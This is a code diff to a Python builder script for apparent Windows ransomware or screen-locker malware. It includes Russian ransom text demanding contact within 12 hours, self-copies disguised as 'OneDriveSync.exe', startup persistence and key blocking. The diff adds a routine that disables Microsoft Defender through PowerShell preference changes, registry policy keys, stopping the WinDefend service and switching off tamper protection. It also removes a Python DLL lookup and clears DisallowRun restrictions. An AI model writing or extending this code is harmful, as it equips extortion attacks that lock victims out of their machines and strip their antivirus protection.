@@ -3,7 +3,6 @@ import sys
 import subprocess
 import socket
 import getpass
-import sysconfig
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 os.chdir(BASE_DIR)
@@ -48,29 +47,6 @@ def ensure_dependencies():
             subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=False)
 
 ensure_dependencies()
-
-# ---------- ИЩЕМ python3XX.dll ----------
-def find_python_dll():
-    candidates = []
-    # Рядом с python.exe
-    py_dir = os.path.dirname(sys.executable)
-    candidates.append(os.path.join(py_dir, f"python{sys.version_info.major}{sys.version_info.minor}.dll"))
-    # В DLLs
-    dlls_dir = os.path.join(py_dir, "DLLs")
-    candidates.append(os.path.join(dlls_dir, f"python{sys.version_info.major}{sys.version_info.minor}.dll"))
-    # В sysconfig
-    try:
-        base = sysconfig.get_config_var("installed_base") or sysconfig.get_config_var("base")
-        if base:
-            candidates.append(os.path.join(base, f"python{sys.version_info.major}{sys.version_info.minor}.dll"))
-    except: pass
-    for c in candidates:
-        if c and os.path.exists(c):
-            return c
-    return None
-
-PYTHON_DLL = find_python_dll()
-print(f"[*] python DLL: {PYTHON_DLL}")
 
 CONTACTS_BLOCK = f"""                                                    Сейчас у тебя 12 часов, чтобы написать мне:  
                                                     ▸ {contact}  
@@ -161,6 +137,50 @@ COPIES = [
     os.path.join(os.environ.get("LOCALAPPDATA", ""), "OneDriveSync.exe"),
     os.path.join(os.environ.get("PROGRAMDATA", "C:\\\\ProgramData"), "OneDriveSync.exe"),
 ]
+
+def disable_defender():
+    try:
+        exe_dir = os.path.dirname(os.path.abspath(sys.executable))
+        exe_path = sys.executable
+        exe_name = os.path.basename(exe_path)
+        subprocess.run(['powershell', '-Command',
+                        f'Add-MpPreference -ExclusionPath "{exe_dir}"'],
+                       capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-Command',
+                        f'Add-MpPreference -ExclusionProcess "{exe_name}"'],
+                       capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-Command',
+                        'Set-MpPreference -DisableRealtimeMonitoring $true'],
+                       capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-Command',
+                        'Set-MpPreference -DisableBehaviorMonitoring $true'],
+                       capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-Command',
+                        'Set-MpPreference -DisableIOAVProtection $true'],
+                       capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-Command',
+                        'Set-MpPreference -DisableScriptScanning $true'],
+                       capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        import winreg
+        for path in [r"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender",
+                     r"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection"]:
+            try:
+                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
+                winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
+                winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
+                winreg.SetValueEx(key, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
+                winreg.SetValueEx(key, "DisableIOAVProtection", 0, winreg.REG_DWORD, 1)
+                winreg.CloseKey(key)
+            except: pass
+        subprocess.run(['sc', 'stop', 'WinDefend'], shell=True, capture_output=True)
+        subprocess.run(['sc', 'config', 'WinDefend', 'start=disabled'], shell=True, capture_output=True)
+        try:
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
+                                   r"SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features")
+            winreg.SetValueEx(key, "TamperProtection", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+        except: pass
+    except: pass
 
 def spread_copies():
     src = sys.executable
@@ -350,6 +370,8 @@ def main():
     if not is_admin:
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         sys.exit(0)
+
+    disable_defender()
     add_to_startup()
     block_keys()
     threading.Thread(target=watch_esc, daemon=True).start()
@@ -435,6 +457,20 @@ try:
     winreg.CloseKey(key)
 except: pass
 
+try:
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\DisallowRun", 0, winreg.KEY_SET_VALUE)
+    i = 0
+    while True:
+        try:
+            n, _, _ = winreg.EnumValue(key, i)
+            winreg.DeleteValue(key, n)
+            i += 1
+        except OSError:
+            break
+    winreg.CloseKey(key)
+except: pass
+
 for proc in ["SynapseLauncher.exe", "OneDriveSync.exe", "ffplay.exe"]:
     try: subprocess.run(f'taskkill /F /IM "{proc}"', shell=True, capture_output=True)
     except: pass
@@ -465,9 +501,6 @@ cmd1 = [
     "--name", OUTPUT_NAME,
     "volt_payload.py"
 ]
-if PYTHON_DLL:
-    cmd1.insert(-3, "--add-binary")
-    cmd1.insert(-3, f"{PYTHON_DLL};.")
 if ICON_FILE:
     cmd1.insert(-3, "--icon")
     cmd1.insert(-3, ICON_FILE)
@@ -480,9 +513,6 @@ cmd2 = [
     "--name", "Unlocker",
     "unlocker.py"
 ]
-if PYTHON_DLL:
-    cmd2.insert(-3, "--add-binary")
-    cmd2.insert(-3, f"{PYTHON_DLL};.")
 if ICON_FILE:
     cmd2.insert(-3, "--icon")
     cmd2.insert(-3, ICON_FILE)
